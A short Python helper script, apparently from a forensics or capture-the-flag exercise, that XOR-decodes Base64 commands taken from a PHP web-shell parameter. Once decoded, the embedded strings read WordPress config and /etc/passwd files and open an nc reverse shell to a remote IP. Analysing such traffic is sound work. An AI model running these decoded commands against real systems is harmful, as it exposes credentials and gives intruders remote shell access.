import base64

def xor_cipher(data: bytes, key: int) -> bytes:
    return bytes([b ^ key for b in data])

# Exemple : payload encodé reçu depuis le paramètre c0M1and
# Remplace ceci par ta vraie chaîne Base64 reçue de la réponse
for base64_payload in ["VUo=", "WlhNGU5JFFpWV19QXhdJUUk=","WlhNGRZcTVoWSVhKSk5d","TVFQShlQShlNUVwZX1VYXg==","SVpYSWZQSmZfTFdmS1BeUU0G","XFpRVhkeSVpYSWZQSmZfTFdmS1BeUU0GHg==","S1QZFk1USRZfAlRSX1BfVhkWTVRJFl8CWlhNGRZNVEkWX0VKURkUUBkLBx8IRVdaGQgACxcIDwEXCBcAGQ4NDg0ZBxZNVEkWXw=="]:
    # Clé XOR identique à PHP : 1337 % 256 = 57
    key = 1337 % 256

    encrypted_data = base64.b64decode(base64_payload)
    decrypted_data = xor_cipher(encrypted_data, key)

    # Affichage de la commande claire
    print("Déchiffré :", decrypted_data.decode(errors="replace"))